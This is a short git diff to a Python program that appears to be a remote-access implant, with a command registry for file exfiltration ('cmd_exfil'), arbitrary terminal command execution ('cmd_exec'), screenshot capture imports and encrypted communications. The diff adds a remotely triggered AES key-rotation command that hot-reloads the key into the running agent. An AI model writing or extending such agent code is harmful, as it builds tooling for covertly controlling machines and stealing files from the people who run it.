@@ -7,6 +7,7 @@ import sys
 from mss import mss
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 import config
+import key_manager
 import shlex
 
 # --- ENCRYPTION HELPER ---
@@ -111,6 +112,21 @@ def exfiltrate_file(filepath):
 def ping_pong(args=None):
     return "🏓 Pong! Agent ready."
 
+def rotate_encryption_key(args=None):
+    """
+    Remote key rotation (🔑 command).
+    Generates a new AES-256 key, saves it, backs up the old one,
+    and hot-reloads it into the running agent.
+    """
+    try:
+        new_key = key_manager.rotate_key()
+        config.AES_KEY = new_key  # Hot-reload — no restart needed
+        backups = key_manager.list_backups()
+        backup_info = f"Backup saved ({len(backups)} backup(s) total)." if backups else ""
+        return f"🔑 Key rotated successfully. {backup_info} Old files can be decrypted with: python decrypt_tool.py --key-file <backup>.bin.bak"
+    except Exception as e:
+        return f"⚠️ Key Rotation Failed: {str(e)}"
+
 def remote_exit(args=None):
     sys.exit(0)
 
@@ -121,5 +137,6 @@ EXEC_REGISTRY = {
     'cmd_ping': ping_pong,
     'cmd_exfil': exfiltrate_file,
     'cmd_exit': remote_exit,
-    'cmd_exec': run_terminal_command  
+    'cmd_exec': run_terminal_command,
+    'cmd_keygen': rotate_encryption_key,
 }
